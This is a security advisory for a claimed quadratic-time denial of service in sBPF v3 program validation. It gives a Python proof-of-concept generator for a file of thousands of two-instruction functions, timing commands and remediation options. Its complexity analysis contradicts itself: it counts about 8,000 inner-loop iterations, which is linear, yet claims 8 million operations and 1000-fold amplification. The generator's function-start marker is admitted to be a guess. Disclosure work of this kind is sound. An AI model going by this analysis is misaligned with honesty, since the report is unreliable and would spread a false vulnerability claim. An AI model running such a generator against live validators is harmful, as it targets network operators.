# DOS-001: Quadratic Validation Complexity in sBPF v3+ Function Validation

## Severity
**High** (when sBPF v3 is enabled)

## Status
- **Current mainnet:** Not exploitable (v2 active, v3 not enabled)
- **Future risk:** Exploitable when v3 feature flag activates
- **Mitigation:** None currently implemented

## Summary
The sBPF VM validator exhibits O(n²) time complexity when validating programs under sBPF v3+ with stricter ELF headers enabled. An attacker can craft a program with many tiny functions to trigger worst-case validation performance, consuming arbitrary CPU time **before** any compute unit checks apply.

## Technical Details

### Vulnerable Code
**Location:** [src/flamenco/vm/fd_vm.c:340-359](../../../src/flamenco/vm/fd_vm.c#L340-L359)

```c
for( ulong i=0UL; i<text_cnt; i++ ) {
  fd_sbpf_instr_t instr = fd_sbpf_instr( text[i] );

  if( FD_UNLIKELY( fd_sbpf_enable_stricter_elf_headers_enabled( sbpf_version ) &&
                   fd_sbpf_is_function_start( instr ) ) ) {
    function_start = i;
    function_next  = i+1;

    // Inner loop scans forward to find function end
    while( function_next<text_cnt &&
           !fd_sbpf_is_function_start( fd_sbpf_instr( text[function_next] ) ) ) {
      function_next++;  // O(n) inner loop
    }

    if( FD_UNLIKELY( !fd_sbpf_is_function_end(
                      fd_sbpf_instr( text[function_next-1] ) ) ) ) {
      return FD_VM_INVALID_FUNCTION;
    }
  }
  // ... rest of validation
}
```

### Activation Condition
**Location:** [src/ballet/sbpf/fd_sbpf_loader.h:369](../../../src/ballet/sbpf/fd_sbpf_loader.h#L369)

```c
static inline int fd_sbpf_enable_stricter_elf_headers_enabled( ulong sbpf_version ) {
  return sbpf_version>=FD_SBPF_V3;
}
```

The quadratic behavior only triggers when:
1. sBPF version >= 3 (controlled by feature flag `BUwGLeF3Lxyfv1J1wY8biFHBB2hrk2QhbNftQf3VV3cC`)
2. Program contains multiple function starts

### Attack Vector

**Program Structure:**
```
Maximum program size: 64 KB = 8,192 instructions
Worst case: ~4,000 tiny functions (2 instructions each)

Function 0: [instruction marking function start]
            [EXIT or JA]
Function 1: [function start]
            [EXIT or JA]
...
Function 3999: [function start]
               [EXIT or JA]
```

**Complexity Analysis:**
- Outer loop: O(n) where n = 8,192 instructions
- Inner loop per function: O(k) where k = instructions until next function
- With 4,000 functions of size 2: 4,000 × 2 = 8,000 inner loop iterations
- Total operations: ~4,000 × 2,000 (average scan distance) = **~8 million operations**

**Time Impact:**
- Normal validation: ~8,192 instruction checks = O(n)
- Attack validation: ~8M+ operations = O(n²)
- **~1000× amplification** compared to linear case

### Why Fuzzing Misses This
AFL++ and coverage-guided fuzzing excel at bit-level mutations but struggle with structural patterns:
1. **No semantic understanding:** Fuzzer doesn't know what makes a "function start"
2. **High-order relationship:** Creating maximum functions requires understanding ELF structure
3. **Coverage paradox:** A few functions and many functions hit the same code paths
4. **Validation vs execution:** Fuzzers optimize for execution depth, not validation performance

## Impact

### Pre-Compute Unit Check
The critical issue is that validation runs in `fd_vm_validate()` which executes **before** `fd_vm_exec()`:

**Fuzzer harness:** [SR/fuzz/sBPF/fuzz_sbpf_vm_realistic.c:469-476](../../../SR/fuzz/sBPF/fuzz_sbpf_vm_realistic.c#L469-L476)
```c
/* Validate program */
int validation_err = fd_vm_validate(vm);  // <-- DoS happens here
if (validation_err != FD_VM_SUCCESS) {
  validation_failures++;
  return 0;
}

/* Execute program */
int exec_err = fd_vm_exec(vm);  // <-- CU limits only enforced here
```

**Consequences:**
- Attacker pays 200K-1.4M compute units for transaction
- Validator burns arbitrary CPU in `fd_vm_validate()` before checking CU budget
- No resource accounting for validation phase
- Single transaction can DoS validator for seconds

### Mainnet Impact (when v3 activates)
- **Transaction spam:** Flood network with quadratic-validation programs
- **Validator slowdown:** CPU exhaustion during block processing
- **Consensus delay:** Block validation takes excessive time
- **Economic attack:** Cheap for attacker (normal CU cost), expensive for validators

## Proof of Concept

### PoC Program Generator
```python
#!/usr/bin/env python3
"""Generate worst-case validation program for sBPF v3."""
import struct

def make_instr(opcode, dst_reg=0, src_reg=0, offset=0, imm=0):
    regs = (dst_reg & 0xF) | ((src_reg & 0xF) << 4)
    return struct.pack('<BBhI', opcode, regs, offset, imm & 0xFFFFFFFF)

# Create maximum number of tiny functions
max_instructions = 8192
instructions_per_function = 2  # Minimum: function start + EXIT/JA
num_functions = max_instructions // instructions_per_function

program = []
for i in range(num_functions):
    # Function start marker (implementation depends on ELF structure)
    program.append(make_instr(0xb7, dst_reg=0, imm=i))  # MOV r0, imm
    program.append(make_instr(0x9d))  # EXIT (function end marker)

# Write to file
with open('dos_quadratic_validation.bin', 'wb') as f:
    for instr in program:
        f.write(instr)

print(f"Generated {num_functions} functions, {len(program)} instructions")
print(f"Expected validation operations: ~{num_functions * (max_instructions // num_functions // 2)}")
```

### Testing
```bash
# When v3 is enabled, this should show significant validation delay
time ./fuzz_sbpf_vm_realistic dos_quadratic_validation.bin

# Compare to normal program of same size
time ./fuzz_sbpf_vm_realistic normal_program.bin
```

## Remediation

### Option 1: Iteration Budget (Recommended)
Add a maximum iteration counter to the validation loop:

```c
#define MAX_VALIDATION_ITERATIONS (text_cnt * 2)  // Allow 2× linear

ulong validation_iterations = 0;

for( ulong i=0UL; i<text_cnt; i++ ) {
  if( ++validation_iterations > MAX_VALIDATION_ITERATIONS ) {
    return FD_VM_ERR_VALIDATION_TIMEOUT;  // New error code
  }

  // ... existing validation logic

  if( fd_sbpf_enable_stricter_elf_headers_enabled( sbpf_version ) &&
      fd_sbpf_is_function_start( instr ) ) {
    function_start = i;
    function_next  = i+1;

    while( function_next<text_cnt &&
           !fd_sbpf_is_function_start( fd_sbpf_instr( text[function_next] ) ) ) {
      function_next++;
      if( ++validation_iterations > MAX_VALIDATION_ITERATIONS ) {
        return FD_VM_ERR_VALIDATION_TIMEOUT;
      }
    }
  }
}
```

**Benefits:**
- Simple to implement
- Maintains O(n) worst-case complexity
- No false positives for legitimate programs

### Option 2: Pre-compute Function Boundaries
Build function table in single O(n) pass before validation:

```c
// First pass: identify all functions
ulong function_boundaries[MAX_FUNCTIONS];
ulong num_functions = 0;

for( ulong i=0UL; i<text_cnt; i++ ) {
  if( fd_sbpf_is_function_start( fd_sbpf_instr( text[i] ) ) ) {
    function_boundaries[num_functions++] = i;
  }
}

// Second pass: validate using pre-computed boundaries
// Now O(n) instead of O(n²)
```

**Benefits:**
- Guaranteed O(n) complexity
- Cleaner separation of concerns

**Drawbacks:**
- Requires additional memory
- More complex implementation

### Option 3: Limit Function Count
Enforce maximum number of functions per program:

```c
#define MAX_FUNCTIONS_PER_PROGRAM 1000

ulong function_count = 0;
for( ulong i=0UL; i<text_cnt; i++ ) {
  if( fd_sbpf_is_function_start( instr ) ) {
    if( ++function_count > MAX_FUNCTIONS_PER_PROGRAM ) {
      return FD_VM_ERR_TOO_MANY_FUNCTIONS;
    }
  }
}
```

**Benefits:**
- Simple check
- Directly addresses attack vector

**Drawbacks:**
- May affect legitimate programs
- Requires choosing appropriate limit

## References

- **sBPF v3 Feature Flag:** `BUwGLeF3Lxyfv1J1wY8biFHBB2hrk2QhbNftQf3VV3cC`
- **SIMD-0189:** Stricter ELF headers (enables this code path)
- **Agave Reference:** https://github.com/anza-xyz/sbpf/blob/v0.12.2/src/verifier.rs#L240-L255

## Timeline
- **2025-01-XX:** Issue identified during security review
- **Current:** Not exploitable (sBPF v2 active on mainnet)
- **Future:** Will become exploitable when v3 feature flag activates

## Credits
Discovered during systematic DoS analysis of sBPF VM validation and execution paths.
